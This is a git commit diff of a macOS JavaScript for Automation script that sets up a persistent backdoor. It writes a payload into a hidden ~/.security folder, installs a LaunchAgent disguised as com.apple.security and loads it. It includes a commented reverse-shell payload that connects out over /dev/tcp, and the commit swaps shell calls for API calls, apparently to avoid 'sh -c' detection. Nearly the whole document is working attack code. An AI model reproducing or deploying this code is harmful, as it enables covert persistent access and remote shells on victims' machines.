cb3bdb5ce7f5c5c60ef0b6289fe4166697f2192d
D00MFist <leslieleopitt@gmail.com>
2020-01-09 23:02:26 -0500

    added more API calls
    removed a few doShellScripts to limit sh -c and replaced with api

--- LAgentPersist.js
+++ LAgentPersist.js
@@ -1,22 +1,39 @@
 //#!/usr/bin/env osascript -l JavaScript
 // Rework of mosca1337's work:
 // https://github.com/mosca1337/OSX-Peristant-BackDoor/blob/master/setup.bash
-//Take in command line argument for the command to execute
+ObjC.import('Foundation')
+ObjC.import("Cocoa");
+ObjC.import('stdlib')
+var app = Application.currentApplication();
+app.includeStandardAdditions = true; 
+
+var userHome = $.getenv('HOME')
 
 //Payload to execute 
 //CHANGE THIS FOR DESIRED PAYLOAD !!!!
-// Make sure to leave the echo function in
-var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
+//var payload = `echo "'ps' > $HOME/test.txt" > $HOME/.security/system.sh`
+var payload = `'ps > ' + userHome + '/test.txt'`
 // Another payload example
 /* 
 var payload = `echo "#!/bin/bash
 bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
 wait" > $HOME/.security/system.sh`
 */
+function createFolder(path, createIntermediateDirectories) {
+    error = $()
+   $.NSFileManager.defaultManager.createDirectoryAtPathWithIntermediateDirectoriesAttributesError(
+        $(path).stringByStandardizingPath, 
+        createIntermediateDirectories, 
+        $(), 
+        error)
+    if (error) {
+        $.NSLog(error.localizedDescription);
+    }
+};
 
 //Malicious plist
 var plist = 
-`'<plist version="1.0">
+`<plist version="1.0">
     <dict>
     <key>Label</key>
         <string>com.apple.security</string>
@@ -32,27 +49,29 @@ var plist =
     <key>AbandonProcessGroup</key>
         <true/>
     </dict>
-</plist>'`
+</plist>`
 
-ObjC.import('Foundation')
-ObjC.import('stdlib')
-var app = Application.currentApplication();
-app.includeStandardAdditions = true; 
+
 
 //Create the hidden directory if it doesn't already exist
 
-var userHome = app.doShellScript("echo $HOME")
+//var userHome = app.doShellScript("echo $HOME")
+//var userHome = $.getenv('HOME')
 var hiddenPath = userHome + "/.security"
 isDir=Ref()
 var hiddenDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(hiddenPath,isDir)
 if (hiddenDirectoryExistsCheck == false) {
 	//console.log("Creating hidden directory...");
+	createFolder("$HOME/.security",true)
 	app.doShellScript("mkdir $HOME/.security")
 					}
 
 //Create the malicious script which is saved to "$HOME/.security/system.sh"
 //console.log("Creating malicious script...");
-app.doShellScript(payload);
+//app.doShellScript(payload);
+var payloadPath = userHome + '/.security/system.sh'
+writePayload = $.NSString.alloc.initWithUTF8String( payload )
+writePayload.writeToFileAtomicallyEncodingError( payloadPath, true, $(), $() )
 
 //Give the script permission to execute
 app.doShellScript("chmod +x $HOME/.security/system.sh");
@@ -61,10 +80,15 @@ app.doShellScript("chmod +x $HOME/.security/system.sh");
 var lauchagentPath = userHome + "/Library/LaunchAgents"
 var launchDirectoryExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(lauchagentPath,isDir)
 if (launchDirectoryExistsCheck == false) {
-	app.doShellScript("mkdir $HOME/Library/LaunchAgents")
+	createFolder("$HOME/Library/LaunchAgents",true)
+	//app.doShellScript("mkdir $HOME/Library/LaunchAgents")
 					}
 //Write the .plist to LaunchAgents
-app.doShellScript("echo" + " " + plist + " " + " > $HOME/Library/LaunchAgents/com.apple.security.plist");
+//app.doShellScript("echo" + " " + plist + " " + " > $HOME/Library/LaunchAgents/com.apple.security.plist");
+var plistfilePath = userHome + "/Library/LaunchAgents/com.apple.security.plist"
+plistfileStr = $.NSString.alloc.initWithUTF8String( plist )
+//fileStr.writeToFileAtomicallyEncodingError( plistfilePath, true, $.NSUTF8StringEncoding, $() )
+plistfileStr.writeToFileAtomicallyEncodingError( plistfilePath, true, $(), $() )
 
 //Load the LaunchAgent
 app.doShellScript("launchctl load $HOME/Library/LaunchAgents/com.apple.security.plist");
